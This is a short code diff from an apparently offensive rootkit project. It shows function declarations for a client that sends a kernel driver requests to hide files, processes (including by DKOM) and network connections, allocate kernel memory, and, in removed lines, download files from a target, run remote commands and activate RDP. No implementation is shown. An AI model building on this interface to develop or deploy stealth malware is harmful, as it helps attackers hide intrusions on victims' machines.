@@ -12,10 +12,5 @@ namespace DriverCalls {
 	PVOID SpecAllocRootkKMD(PVOID AllocAddress, ULONG64 AllocSize, const char* ModuleName, SOCKET tosock, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits);  // RKOP_PRCMALLOC request
 	BOOL HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus);  // RKOP_HIDEFILE request
 	BOOL HideProcessRootkKMD(char ModuleName[], BOOL IS_DKOM, int ProcessId, int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus);  // RKOP_HIDEPROC request
-	BOOL HidePortConnectionRootkKMD(char ModuleName[], USHORT PortNumber, USHORT RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus);  // RKOP_HIDEPORT request
-}
-namespace GeneralRequests {
-	BOOL DownloadFileRequest(char* FilePath, SOCKET ClientToServerSocket);  // Get file from target
-	BOOL RemoteCommandRequest(char* NakedCommand, SOCKET ClientToServerSocket);  // Execute command
-	BOOL ActivateRDPRequest(SOCKET ClientToServerSocket, char* DummyString);  // Activate RDP server
+	BOOL HideNetworkingRootkKMD(char ModuleName[], char* IpAddress, USHORT RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus);  // RKOP_HIDEPORT request
 }
